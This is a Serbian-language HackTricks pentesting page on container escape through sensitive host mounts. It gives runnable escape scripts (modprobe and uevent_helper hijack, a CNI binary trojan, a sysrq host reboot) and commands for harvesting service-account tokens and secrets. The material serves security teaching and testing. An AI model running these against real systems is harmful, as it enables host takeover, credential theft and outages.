# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

Host mounts su jedna od najvažnijih praktičnih površina za container-escape, zato što često poništavaju pažljivo izolovan pogled procesa i vraćaju direktnu vidljivost host resursa. Opasni slučajevi nisu ograničeni na `/`. Bind mounts od `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state ili putanje povezane sa uređajima mogu otkriti kernel kontrole, credentials, filesystem-e susednih containera i runtime management interfejse.

Ova stranica postoji odvojeno od pojedinačnih stranica o zaštiti zato što je model zloupotrebe preklapajući. Writable host mount je opasan delom zbog mount namespaces, delom zbog user namespaces, delom zbog AppArmor ili SELinux pokrivenosti, i delom zbog toga koja je tačno host path bila izložena. Posmatranje ovoga kao posebne teme mnogo olakšava razumevanje attack surface-a.

## `/proc` Exposure

procfs sadrži i obične informacije o procesima i visoko-rizične kernel control interfejse. Bind mount poput `-v /proc:/host/proc` ili container prikaz koji izlaže neočekivane writable proc unose može zato dovesti do information disclosure, denial of service ili direktnog host code execution-a.

Visokovredne procfs putanje uključuju:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Počnite tako što ćete proveriti koje su visokovredne procfs stavke vidljive ili writable:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Ove putanje su zanimljive iz različitih razloga. `core_pattern`, `modprobe`, i `binfmt_misc` mogu postati host code-execution putanje kada su writable. `kallsyms`, `kmsg`, `kcore`, i `config.gz` su moćni izvori za reconnaissance za kernel exploitation. `sched_debug` i `mountinfo` otkrivaju process, cgroup, i filesystem kontekst koji mogu pomoći da se rekonstruiše host layout iznutra iz container-a.

Praktična vrednost svake putanje je različita, a tretiranje svih kao da imaju isti impact otežava triage:

- `/proc/sys/kernel/core_pattern`
Ako je writable, ovo je jedna od procfs putanja sa najvećim impactom jer će kernel izvršiti pipe handler nakon crash-a. Container koji može da usmeri `core_pattern` na payload smešten u svom overlay-u ili u mounted host path-u često može da dobije host code execution. Pogledajte i [read-only-paths.md](protections/read-only-paths.md) za poseban primer.
- `/proc/sys/kernel/modprobe`
Ova putanja kontroliše userspace helper koji kernel koristi kada treba da pozove module-loading logic. Ako je writable iz container-a i interpretirana u host context-u, može postati još jedna host code-execution primitive. Posebno je zanimljiva kada se kombinuje sa načinom da se aktivira helper path.
- `/proc/sys/vm/panic_on_oom`
Ovo obično nije čista escape primitive, ali može da pretvori memory pressure u host-wide denial of service tako što OOM uslove pretvara u kernel panic behavior.
- `/proc/sys/fs/binfmt_misc`
Ako je registration interface writable, attacker može da registruje handler za izabranu magic vrednost i dobije execution u host context-u kada se pokrene odgovarajući file.
- `/proc/config.gz`
Korisno za kernel exploit triage. Pomaže da se utvrdi koji su subsystems, mitigations, i opcionalne kernel features uključeni bez potrebe za host package metadata.
- `/proc/sysrq-trigger`
Uglavnom denial-of-service putanja, ali veoma ozbiljna. Može odmah da reboot-uje, panic-uje, ili na drugi način poremeti host.
- `/proc/kmsg`
Otkriva kernel ring buffer poruke. Korisno za host fingerprinting, crash analysis, i u nekim okruženjima za leak informacija koje pomažu kernel exploitation-u.
- `/proc/kallsyms`
Vredna kada je readable jer otkriva exported kernel symbol informacije i može pomoći da se zaobiđu address randomization pretpostavke tokom razvoja kernel exploit-a.
- `/proc/[pid]/mem`
Ovo je direktan process-memory interface. Ako je target process dostupan sa potrebnim ptrace-style uslovima, može dozvoliti čitanje ili modifikovanje memorije drugog procesa. Realan impact u velikoj meri zavisi od credentials, `hidepid`, Yama, i ptrace restrikcija, pa je ovo moćna, ali uslovna putanja.
- `/proc/kcore`
Otkriva core-image-style prikaz sistemske memorije. File je ogroman i nezgodan za upotrebu, ali ako je smisleno readable, to ukazuje na loše izloženu host memory površinu.
- `/proc/kmem` i `/proc/mem`
Istorijski visoko-impact raw memory interfejsi. Na mnogim modernim sistemima su onemogućeni ili jako ograničeni, ali ako postoje i mogu da se koriste, treba ih tretirati kao kritične nalaze.
- `/proc/sched_debug`
Leak-uje scheduling i task informacije koje mogu otkriti host process identitete čak i kada drugi process prikazi izgledaju čistije nego što se očekuje.
- `/proc/[pid]/mountinfo`
Izuzetno korisno za rekonstrukciju gde container zaista živi na host-u, koji su paths overlay-backed, i da li writable mount odgovara host sadržaju ili samo container layer-u.

Ako su `/proc/[pid]/mountinfo` ili overlay detalji readable, iskoristite ih da povratite host path container filesystem-a:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Ove komande su korisne jer je za određeni broj host-execution trikova potrebno pretvoriti path unutar kontejnera u odgovarajući path iz perspektive hosta.

### Potpuni primer: `modprobe` Helper Path Abuse

Ako je `/proc/sys/kernel/modprobe` upisiv iz kontejnera i helper path se interpretira u host kontekstu, može se preusmeriti na payload pod kontrolom napadača:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Tačan okidač zavisi od targeta i ponašanja kernela, ali važna poenta je da writable helper path može preusmeriti buduće kernel helper pozivanje na attacker-controlled host-path content.

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

Ako je cilj procena exploatability umesto trenutnog escape-a:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Ove komande pomažu da se odgovori da li je korisna simbolička informacija vidljiva, da li nedavne kernel poruke otkrivaju zanimljivo stanje i koje kernel funkcije ili mitigations su kompajlirane. Uticaj obično nije direktan escape, ali može znatno skratiti kernel-vulnerability triage.

### Full Example: SysRq Host Reboot

Ako je `/proc/sysrq-trigger` upisiv i dostiže host view:
```bash
echo b > /proc/sysrq-trigger
```
Efekat je trenutno ponovno pokretanje hosta. Ovo nije suptilan primer, ali jasno pokazuje da izloženost procfs može biti mnogo ozbiljnija od otkrivanja informacija.

## `/sys` Exposure

sysfs izlaže velike količine kernel i device stanja. Neke sysfs putanje su uglavnom korisne za fingerprinting, dok druge mogu uticati na helper execution, ponašanje device-a, konfiguraciju security-module, ili stanje firmware-a.

Putanje visoke vrednosti u sysfs uključuju:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Ove putanje su važne iz različitih razloga. `/sys/class/thermal` može uticati na ponašanje thermal-management i samim tim na stabilnost hosta u loše izloženim okruženjima. `/sys/kernel/vmcoreinfo` može otkriti crash-dump i kernel-layout informacije koje pomažu pri low-level fingerprinting hosta. `/sys/kernel/security` je `securityfs` interfejs koji koriste Linux Security Modules, pa neočekivan pristup tamo može otkriti ili izmeniti MAC-related stanje. EFI variable putanje mogu uticati na firmware-backed boot podešavanja, što ih čini mnogo ozbiljnijim od običnih konfiguracionih fajlova. `debugfs` pod `/sys/kernel/debug` je posebno opasan zato što je namerno developer-oriented interfejs sa mnogo manje bezbednosnih očekivanja nego hardened production-facing kernel APIs.

Korisne komande za pregled ovih putanja su:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Šta čini te komande zanimljivim:

- `/sys/kernel/security` može otkriti da li su AppArmor, SELinux ili neki drugi LSM surface vidljivi na način koji je trebalo da ostane host-only.
- `/sys/kernel/debug` je često najalarmantniji nalaz u ovoj grupi. Ako je `debugfs` mounted i čitljiv ili upisiv, očekujte širok kernel-facing surface čiji tačan rizik zavisi od omogućenih debug čvorova.
- EFI izlaganje varijabli je ređe, ali ako je prisutno, ima visok uticaj jer se odnosi na firmware-backed podešavanja, a ne na obične runtime fajlove.
- `/sys/class/thermal` je uglavnom relevantan za stabilnost hosta i interakciju sa hardverom, a ne za uredan shell-style escape.
- `/sys/kernel/vmcoreinfo` je uglavnom izvor za host fingerprinting i crash analizu, koristan za razumevanje low-level kernel stanja.

### Full Example: `uevent_helper`

Ako je `/sys/kernel/uevent_helper` upisiv, kernel može izvršiti helper pod kontrolom napadača kada se pokrene `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Razlog zašto ovo radi je taj što se helper path tumači iz perspektive hosta. Kada se jednom pokrene, helper radi u host kontekstu umesto unutar trenutnog container-a.

## `/var` Exposure

Mountovanje hostovog `/var` u container se često potcenjuje zato što ne izgleda toliko dramatično kao mountovanje `/`. U praksi, to može biti dovoljno da se dođe do runtime sockets, container snapshot direktorijuma, kubelet-managed pod volumena, projected service-account tokena i filesystema susednih aplikacija. Na modernim nodovima, `/var` je često mesto gde zapravo živi najzanimljivije operational container stanje.

### Kubernetes Example

Pod sa `hostPath: /var` često može da pročita projected tokene drugih podova i overlay snapshot sadržaj:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Ove komande su korisne zato što odgovaraju na pitanje da li mount izlaže samo dosadne application podatke ili visokoprioritetne cluster credentials. Čitljiv service-account token može odmah pretvoriti local code execution u Kubernetes API access.

Ako je token prisutan, proveri do čega može da dođe umesto da staneš na otkrivanju tokena:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Uticaj ovde može biti mnogo veći od lokalnog pristupa node-u. Token sa širokim RBAC može pretvoriti mountovan `/var` u kompromitovanje celog cluster-a.

### Docker And containerd Example

Na Docker hostovima relevantni podaci su često u `/var/lib/docker`, dok na containerd-backed Kubernetes node-ovima mogu biti u `/var/lib/containerd` ili path-ovima specifičnim za snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Ako montirani `/var` izlaže upisivi snapshot sadržaj drugog workload-a, napadač bi mogao da izmeni fajlove aplikacije, postavi web sadržaj ili promeni startup skripte bez diranja trenutne konfiguracije containera.

Konretne abuse ideje kada se pronađe upisivi snapshot sadržaj:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Ove komande su korisne zato što pokazuju tri glavne porodice uticaja mountovanog `/var`: manipulaciju aplikacijama, oporavak tajni i lateral movement u susedne workloads.

## Kubelet State, Plugins, And CNI Paths

Mount `/var/lib/kubelet`, `/opt/cni/bin`, ili `/etc/cni/net.d` je često izložen kroz privileged DaemonSets, CNI agente, CSI node plugins, GPU operatore, i storage pomoćnike. Ovi mountovi se lako odbacuju kao "node plumbing", ali se nalaze direktno u execution path za nove podove i često sadrže kubelet credentials, projected secrets, registration sockets, i izvršne host-side plugin binaries.

High-value targets include:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Korisne komande za pregled su:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Zašto su ove putanje važne:

- `/var/lib/kubelet/pki` može otkriti kubelet client certificates i druge node-local credentials koji se ponekad mogu ponovo upotrebiti protiv API server-a ili kubelet-facing TLS endpoints, u zavisnosti od dizajna cluster-a.
- `/var/lib/kubelet/pods` često sadrži projected service-account tokens i mounted Secrets za susedne pods na istom node-u.
- `/var/lib/kubelet/pod-resources/kubelet.sock` je uglavnom reconnaissance surface, ali veoma korisna: otkriva koji pods i containers trenutno koriste GPUs, hugepages, SR-IOV devices i druge scarce node-local resources.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` i `/var/lib/kubelet/plugins_registry` otkrivaju koji CSI, DRA i device plugins su instalirani i sa kojim socket-ima kubelet očekuje da komunicira. Ako su ti direktorijumi writable, a ne samo readable, nalaz postaje mnogo ozbiljniji.
- `/opt/cni/bin` i `/etc/cni/net.d` se nalaze direktno na putanji za pod-network setup. Writable access tamo je često delayed host-execution primitive, a ne samo izlaganje konfiguracije.

### Full Example: Writable `/opt/cni/bin`

Ako je host CNI binary directory mounted read-write, zamena plugin-a može biti dovoljna da se dobije host execution sledeći put kada kubelet napravi pod sandbox na tom node-u:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Ovo nije tako trenutno kao mountovan `docker.sock`, ali je često realnije u kompromitovanim Kubernetes infrastrukturnim podovima. Važna poenta je da modifikovani binary kasnije izvršava flow za host network setup, a ne trenutni container.


## Runtime Sockets

Sensitive host mounts često uključuju runtime sockets umesto celih direktorijuma. Oni su toliko važni da zaslužuju eksplicitno ponavljanje ovde:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Pogledajte [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) za potpune tokove eksploatacije kada je jedan od ovih socket-a mountovan.

Kao brz prvi obrazac interakcije:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Ako jedan od ovih uspe, put od "mounted socket" do "start a more privileged sibling container" je obično mnogo kraći nego bilo koji kernel breakout put.

## Mount-Related CVEs

Host mountovi se takođe preklapaju sa runtime ranjivostima. Važni noviji primeri uključuju:

- `CVE-2024-21626` u `runc`, gde procureli directory file descriptor može postaviti working directory na host filesystem.
- `CVE-2024-23651`, `CVE-2024-23652`, i `CVE-2024-23653` u BuildKit, gde zlonamerni Dockerfiles, frontends, i `RUN --mount` tokovi mogu ponovo uvesti host file access, deletion, ili elevated privileges tokom buildova.
- `CVE-2024-1753` u Buildah i Podman build tokovima, gde crafted bind mounts tokom builda mogu izložiti `/` read-write.
- `CVE-2025-47290` u `containerd` 2.1.0, gde TOCTOU tokom image unpack može dozvoliti posebno crafted image da modifikuje host filesystem tokom pull.

Ovi CVEs su važni ovde jer pokazuju da handling mountova nije samo pitanje operator konfiguracije. Sam runtime takođe može uvesti mount-driven escape uslove.

## Checks

Koristite ove komande da brzo locirate mount exposure sa najvećom vrednošću:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Šta je zanimljivo ovde:

- Host root, `/proc`, `/sys`, `/var`, i runtime sockets su sve nalazi visokog prioriteta.
- Writable proc/sys unosi često znače da mount izlaže host-global kernel kontrole umesto bezbednog container prikaza.
- Mounted `/var` putanje zaslužuju pregled kredencijala i susednih workload-ova, ne samo pregled filesystem-a.
- Kubelet state directories i CNI/plugin putanje zaslužuju isti prioritet kao runtime sockets jer često stoje direktno na putanji za kreiranje podova i distribuciju kredencijala na node-u.

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
